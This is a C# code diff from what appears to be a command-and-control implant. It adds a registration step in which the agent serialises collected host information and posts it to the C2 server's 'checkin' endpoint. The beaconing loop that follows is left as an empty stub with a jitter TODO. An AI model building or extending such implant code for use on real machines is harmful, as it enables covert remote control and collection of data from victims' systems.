@@ -5,6 +5,8 @@ using System.Collections.Concurrent;
 using System.Diagnostics;
 using System.IO.Pipes;
 using Agent.ModuleBase;
+using Agent.Models.C2Request;
+using System.Text.Json;
 
 AgentInformationService agentInformationService = new AgentInformationService();
 
@@ -28,14 +30,35 @@ if (agentInfo is not null)
 var delay = baseConfig.Sleep;
 var jitter = baseConfig.Jitter;
 
+// Contact request 
+var request = new C2Request
+{
+    AgentId = baseConfig.AgentId,
+    AgentStatus = AgentStatus.Stage1,
+    Reason = C2RequestReason.Register,
+    Message = JsonSerializer.Serialize(agentInfo)
+};
+
+// Init contact request
+var communicationService = new CommunicationService(baseConfig);
+var registrationResult = await communicationService.SimplePostAsync("checkin", JsonSerializer.Serialize(request));
+
+if (registrationResult is null)
+{
+    Console.WriteLine("Failed to register with the C2 server.");
+    Environment.Exit(1);
+}
 try
 {
     // Main loop
     while (true)
     {
         using (var client = new HttpClient())
+        {
 
-        await Task.Delay(baseConfig.Sleep * 1000);
+        }
+
+        await Task.Delay(baseConfig.Sleep * 1000); // TODO : Implement jitter
     }
 }
 catch (Exception ex)
